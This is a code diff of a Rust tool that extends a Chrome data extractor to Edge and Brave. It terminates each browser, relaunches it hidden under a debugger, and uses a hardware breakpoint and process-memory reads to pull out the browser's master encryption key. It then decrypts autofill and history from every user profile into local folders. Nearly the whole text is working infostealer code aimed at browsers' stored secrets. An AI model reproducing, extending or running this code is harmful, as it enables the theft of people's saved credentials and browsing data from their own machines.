@@ -126,6 +126,42 @@ pub struct IMAGE_NT_HEADERS64 {
     pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
 }
 
+struct BrowserConfig {
+    name: &'static str,
+    exe_path: &'static str,
+    exe_name: &'static str,
+    dll_name: &'static str,
+    user_data_subpath: &'static [&'static str],
+    output_folder: &'static str,
+}
+
+const BROWSERS: [BrowserConfig; 3] = [
+    BrowserConfig {
+        name: "Google Chrome",
+        exe_path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        exe_name: "chrome.exe",
+        dll_name: "chrome.dll",
+        user_data_subpath: &["Google", "Chrome", "User Data"],
+        output_folder: "chrome_extract",
+    },
+    BrowserConfig {
+        name: "Microsoft Edge",
+        exe_path: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+        exe_name: "msedge.exe",
+        dll_name: "msedge.dll",
+        user_data_subpath: &["Microsoft", "Edge", "User Data"],
+        output_folder: "edge_extract",
+    },
+    BrowserConfig {
+        name: "Brave Browser",
+        exe_path: "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
+        exe_name: "brave.exe",
+        dll_name: "chrome.dll",
+        user_data_subpath: &["BraveSoftware", "Brave-Browser", "User Data"],
+        output_folder: "brave_extract",
+    },
+];
+
 // X64 Context
 #[repr(C)]
 #[cfg(target_arch = "x86_64")]
@@ -265,46 +301,59 @@ extern "system" {
 
 fn main() {
     unsafe {
-        kill_chrome_processes();
-
-        let mut si: STARTUPINFOW = zeroed();
-        si.cb = size_of::<STARTUPINFOW>() as u32;
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE as u16;
-        let mut pi: PROCESS_INFORMATION = zeroed();
-
-        let mut chrome_cmd: Vec<u16> = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check\0"
-            .encode_utf16()
-            .collect();
-
-        let success = CreateProcessW(
-            null(),
-            chrome_cmd.as_mut_ptr(),
-            null(),
-            null(),
-            FALSE,
-            DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
-            null(),
-            null(),
-            &si,
-            &mut pi,
-        );
-
-        if success == 0 {
-            eprintln!("Failed to create Chrome process: {}", GetLastError());
-            return;
+        for config in &BROWSERS {
+            println!("--- Processing {} ---", config.name);
+            attach_and_extract(config);
         }
-
-        println!("Started Chrome with PID: {}", pi.dwProcessId);
-
-        debug_loop(pi.hProcess);
-
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
     }
 }
 
-unsafe fn kill_chrome_processes() {
+unsafe fn attach_and_extract(config: &BrowserConfig) {
+    if !Path::new(config.exe_path).exists() {
+        println!("{} not found at {}", config.name, config.exe_path);
+        return;
+    }
+
+    kill_browser_processes(config.exe_name);
+
+    let mut si: STARTUPINFOW = zeroed();
+    si.cb = size_of::<STARTUPINFOW>() as u32;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE as u16;
+    let mut pi: PROCESS_INFORMATION = zeroed();
+
+    let mut cmd: Vec<u16> = format!("\"{}\" --no-first-run --no-default-browser-check", config.exe_path)
+        .encode_utf16()
+        .chain(std::iter::once(0))
+        .collect();
+
+    let success = CreateProcessW(
+        null(),
+        cmd.as_mut_ptr(),
+        null(),
+        null(),
+        FALSE,
+        DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
+        null(),
+        null(),
+        &si,
+        &mut pi,
+    );
+
+    if success == 0 {
+        eprintln!("Failed to create {} process: {}", config.name, GetLastError());
+        return;
+    }
+
+    println!("Started {} with PID: {}", config.name, pi.dwProcessId);
+
+    debug_loop(pi.hProcess, config);
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+unsafe fn kill_browser_processes(target_exe: &str) {
     let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snapshot != INVALID_HANDLE_VALUE {
         let mut pe: PROCESSENTRY32W = zeroed();
@@ -315,7 +364,7 @@ unsafe fn kill_chrome_processes() {
                 let exe_name = String::from_utf16_lossy(&pe.szExeFile);
                 let exe_name = exe_name.trim_matches('\0');
 
-                if exe_name.to_lowercase() == "chrome.exe" {
+                if exe_name.to_lowercase() == target_exe.to_lowercase() {
                     let h_process = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                     if h_process != 0 {
                         TerminateProcess(h_process, 0);
@@ -332,7 +381,8 @@ unsafe fn kill_chrome_processes() {
     }
 }
 
-unsafe fn debug_loop(h_process: HANDLE) {
+
+unsafe fn debug_loop(h_process: HANDLE, config: &BrowserConfig) {
     let mut debug_event: DEBUG_EVENT = zeroed();
     let mut _chrome_dll_base: *mut std::ffi::c_void = null_mut();
     let mut target_address: usize = 0;
@@ -349,8 +399,8 @@ unsafe fn debug_loop(h_process: HANDLE) {
                 let len = GetFinalPathNameByHandleW(load_dll.hFile, buffer.as_mut_ptr(), buffer.len() as u32, 0);
                 if len > 0 {
                     let path = String::from_utf16_lossy(&buffer[..len as usize]);
-                    if path.contains("chrome.dll") {
-                        println!("Found chrome.dll at {:?}", load_dll.lpBaseOfDll);
+                    if path.contains(config.dll_name) {
+                        println!("Found {} at {:?}", config.dll_name, load_dll.lpBaseOfDll);
                         _chrome_dll_base = load_dll.lpBaseOfDll;
                         target_address = find_target_address(h_process, _chrome_dll_base);
                         if target_address != 0 {
@@ -373,7 +423,7 @@ unsafe fn debug_loop(h_process: HANDLE) {
                 if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                     if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
                         println!("Target breakpoint hit!");
-                        if extract_key(debug_event.dwThreadId, h_process) {
+                        if extract_key(debug_event.dwThreadId, h_process, config) {
                             clear_hardware_breakpoints(debug_event.dwProcessId);
                             TerminateProcess(h_process, 0);
                         }
@@ -548,8 +598,8 @@ unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     CloseHandle(h_thread);
 }
 
-fn get_v10_key() -> Option<[u8; 32]> {
-    let local_state_path = get_user_data_dir()?.join("Local State");
+fn get_v10_key(user_data_dir: &Path) -> Option<[u8; 32]> {
+    let local_state_path = user_data_dir.join("Local State");
     let content = fs::read_to_string(&local_state_path).ok()?;
     let json: serde_json::Value = serde_json::from_str(&content).ok()?;
     let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
@@ -598,12 +648,12 @@ fn base64_decode(input: &str) -> Option<Vec<u8>> {
     None
 }
 
-fn get_user_data_dir() -> Option<PathBuf> {
+fn get_user_data_dir(subpath: &[&str]) -> Option<PathBuf> {
     let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
-    let path = Path::new(&local_app_data)
-        .join("Google")
-        .join("Chrome")
-        .join("User Data");
+    let mut path = PathBuf::from(&local_app_data);
+    for part in subpath {
+        path.push(part);
+    }
     if path.exists() {
         Some(path)
     } else {
@@ -799,18 +849,18 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
     }
 }
 
-fn extract_all_profiles_data(v20_key: &[u8; 32]) {
-    let user_data_dir = match get_user_data_dir() {
+fn extract_all_profiles_data(v20_key: &[u8; 32], config: &BrowserConfig) {
+    let user_data_dir = match get_user_data_dir(config.user_data_subpath) {
         Some(d) => d,
         None => return,
     };
 
-    let v10_key = get_v10_key();
+    let v10_key = get_v10_key(&user_data_dir);
     let v10_cipher = v10_key.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(k)));
     let v20_cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(v20_key));
 
     let profiles = discover_profiles(&user_data_dir);
-    let extract_root = Path::new("chrome_extract");
+    let extract_root = Path::new(config.output_folder);
     let _ = fs::create_dir_all(extract_root);
 
     for profile_name in profiles {
@@ -824,10 +874,10 @@ fn extract_all_profiles_data(v20_key: &[u8; 32]) {
         extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher));
         extract_history(&profile_path, &output_dir);
     }
-    println!("Extraction complete. Data saved in chrome_extract folder.");
+    println!("Extraction complete. Data saved in {} folder.", config.output_folder);
 }
 
-unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
+unsafe fn extract_key(thread_id: u32, h_process: HANDLE, config: &BrowserConfig) -> bool {
     let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
     if h_thread == 0 {
         return false;
@@ -853,7 +903,7 @@ unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
                 if ReadProcessMemory(h_process, data_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
                     if key.iter().any(|&b| b != 0) {
                         println!("Extracted Master Key from 0x{:X}", data_ptr);
-                        extract_all_profiles_data(&key);
+                        extract_all_profiles_data(&key, config);
                         success = true;
                         break;
                     }
